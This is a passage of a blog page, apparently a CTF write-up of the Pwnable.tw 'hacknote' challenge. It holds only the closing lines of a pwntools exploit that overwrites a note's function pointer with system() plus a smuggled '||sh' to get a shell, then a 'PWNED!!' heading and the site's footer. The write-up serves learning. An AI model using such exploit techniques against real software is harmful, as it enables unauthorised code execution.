class="line">add_note(<span class="number">0x8</span>, p32(system_addr)+<span class="string">b&#x27;||sh&#x27;</span>)</span><br><span class="line">print_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p><strong>PWNED!!</strong><br><img src="https://hackmd.io/_uploads/rJEreG9-ye.png" alt="image"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">2.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">3.</span> <span class="toc-text">After all</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/11/07/pwnable-tw-hacknote/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/11/07/pwnable-tw-hacknote/&text=hacknote on Pwnable.tw"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/11/07/pwnable-tw-hacknote/&title=hacknote on Pwnable.tw"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/11/07/pwnable-tw-hacknote/&is_video=false&description=hacknote on Pwnable.tw"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=hacknote on Pwnable.tw&body=Check out this article: http://wha13.github.io/2024/11/07/pwnable-tw-hacknote/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/11/07/pwnable-tw-hacknote/&title=hacknote on Pwnable.tw"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/11/07/pwnable-tw-hacknote/&title=hacknote on Pwnable.tw"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/11/07/pwnable-tw-hacknote/&title=hacknote on Pwnable.tw"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/11/07/pwnable-tw-hacknote/&title=hacknote on Pwnable.tw"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/11/07/pwnable-tw-hacknote/&name=hacknote on Pwnable.tw&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/11/07/pwnable-tw-hacknote/&t=hacknote on Pwnable.tw"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    William Lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
